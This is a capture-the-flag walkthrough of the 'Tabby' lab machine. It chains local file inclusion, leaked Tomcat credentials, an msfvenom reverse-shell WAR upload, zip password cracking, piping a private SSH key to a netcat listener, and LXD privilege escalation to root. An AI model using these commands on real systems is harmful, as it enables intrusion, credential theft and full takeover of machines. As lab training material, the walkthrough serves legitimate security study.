# TABBY

### User Flag

```
user@kali:~$ nmap -T5 -p- 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 10:38 CEST
Warning: 10.10.10.194 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.194
Host is up (0.10s latency).
Not shown: 64707 closed ports, 824 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 516.94 seconds
```

Looking at the source code of the webpage at port 80, we find a reference to `http://10.10.10.194/news.php?file=statement`. Because the syntax, it looks like we can read files using the `file` field with the php file. This is known as LFI (local file inclusion). We can try to read a public accesible file:

```
user@kali:~$ wget "http://10.10.10.194/news.php?file=../../../../proc/cpuinfo" -O cpuinfo
Connecting to 10.10.10.194:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2194 (2.1K) [text/html]
Saving to: 'cpuinfo'
```

We need to include `..\` as many time as needed until we have a match.

We find tomcat 9.0.31 in port 8080. If we look at the webpage (`http://10.10.10.194:8080`), we find that there a file where users are defined. According to this page, the file is at `/etc/tomcat9/tomcat-users.xml`. If we use `news.php` to read it we will fail. After some research, it looks like the file `tomcat-users.xml` is at a different location. According to [this page](https://ubuntu.pkgs.org/20.04/ubuntu-universe-amd64/tomcat9_9.0.31-1_all.deb.html), the file is at:

```
user@kali:~$ wget "http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml" -O tomcat-users.xml
```

Inside the file we will find the user and password of the tomcat admin:

```
user: tomcat
password: $3cureP4s5w0rd123!
```

If we log into the `http://10.10.10.194:8080/manager/` page using the creedentials, it complains that we have not enough privilege. We can log into the `http://10.10.10.194:8080/host-manager/`. We can't upload a malicious war file using the webpage itself, but we can do so using `curl` ([reference](https://stackoverflow.com/questions/48173104/curl-deployment-of-versioned-war-on-tomcat)). Thus, we craft the war file and upload it to the server.

```
user@kali:~$ msfvenom -p java/shell_reverse_tcp LHOST=IP_ADRESS LPORT=4444 -f war > shell.war
user@kali:~$ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/dr_noob'
```

We listen with `nc` and load `http://10.10.10.194:8080/dr_noob` webpage:

```
user@kali:~$ nc -lnvvvp 4444
listening on [any] 4444 ...
connect to [10.10.14.85] from (UNKNOWN) [10.10.10.194] 36142
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$
```

The next step is to log in as root as a normal user.

```
tomcat@tabby:/var/www/html/files$ grep 'bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Doing a bit of research in the filesystem, we find interesting files at the root directory of the http server.

```
tomcat@tabby:/var/www/html/files$ ls -l
total 28
-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Jun 16 20:13 archive
drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement
```

If we download the backup (using `nc`), we find that it's protected using a password. We can try to crack the password:

```
user@kali:~$ sudo zip2john 16162020_backup.zip > secret.hash
user@kali:~$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash
```

The password of the zip file is: `admin@it`. Because the zip file is owned by `ash`, we may think that the password is the same for the `ash` user.

```
tomcat@tabby:/var/www/html/files$ su -l ash
su -l ash
Password: admin@it

ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

### Root flag

Running a bunch of scripts to scalate privileges, we find that `ash` is in the `lxd` group (linux containers) and it looks like we are able to manage containers with this user. I found a webpage explaining [how to exploit LXD](https://shenaniganslabs.io/2019/05/21/LXD-LPE.html). The only requisite is to be in the `lxd` group.

First, I will connect to the machine using SSH instead of using the previous dummy terminal. In this machine, password authentication is disabled.

```
ash@tabby:~$ grep PasswordAuthentication /etc/ssh/sshd_config
grep PasswordAuthentication /etc/ssh/sshd_config
#PasswordAuthentication yes
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication, then enable this but set PasswordAuthentication
PasswordAuthentication no
```

But we are still able to connect using SSH keys.

```
ash@tabby:~$ ssh-keygen
...
ash@tabby:~$ cat .ssh/id_rsa.pub > .ssh/authorized_keys
ash@tabby:~$ chmod 664 .ssh/authorized_keys
ash@tabby:~$ cat .ssh/id_rsa | nc MY_IP_ADRESS 5000
```

```
user@kali:~$ nc -lnvvvp 5000 > ash_key
user@kali:~$ chmod 400 ash_key
user@kali:~$ ssh -i ash_key ash@10.10.10.194
```

And we are good to go.

In the webpage I mentioned before, the first step is to launch a container. We can't do so in the first place, because the machine has no internet connection. We can [download an image](https://uk.images.linuxcontainers.org/images/) and upload to it the server.

```
user@kali:~$ wget "https://uk.images.linuxcontainers.org/images/ubuntu/bionic/amd64/cloud/20201011_07:42/lxd.tar.xz"
user@kali:~$ wget "https://uk.images.linuxcontainers.org/images/ubuntu/bionic/amd64/cloud/20201011_07:42/rootfs.squashfs"
user@kali:~$ scp -i ash_key lxd.tar.xz ash@10.10.10.194:~
user@kali:~$ scp -i ash_key rootfs.squashfs ash@10.10.10.194:~
```

I found [how to import the image](https://blog.simos.info/using-distrobuilder-to-create-container-images-for-lxc-and-lxd/), so I just do the same:

```
ash@tabby:~$ lxd init
ash@tabby:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias dr_noob
ash@tabby:~$ lxc launch dr_noob
```

We need to find out the id of the container to exploit it with [lxd_rootv2.py](https://github.com/initstring/lxd_root/blob/master/lxd_rootv2.py).


```
ash@tabby:~$ lxd ls
```

In my case, it was `concise-pipefish`. Download `lxd_rootv2.py` and exploit:

```
ash@tabby:~$ python3 lxd_rootv2.py concise-pipefish

                    lxd_root (version 2)
//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/lxd_root   ||
\\=========[]==========================================//

[+] Starting container concise-pipefish
Error: Common start logic: The container is already running
[+] Proxying the systemd socket into the container
Device container_sock added to concise-pipefish
[+] Proxying it back out to the host
Device host_sock added to concise-pipefish
[+] Sending command: systemctl link /tmp/evil.service
[+] Sending command: systemctl daemon-reload
[+] Sending command: systemctl start evil.service
[+] Sending command: systemctl disable evil.service
[+] Cleaning up some temporary files
Device host_sock removed from concise-pipefish
Device container_sock removed from concise-pipefish
[+] All done! Enjoy your new sudo super powers
ash@tabby:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
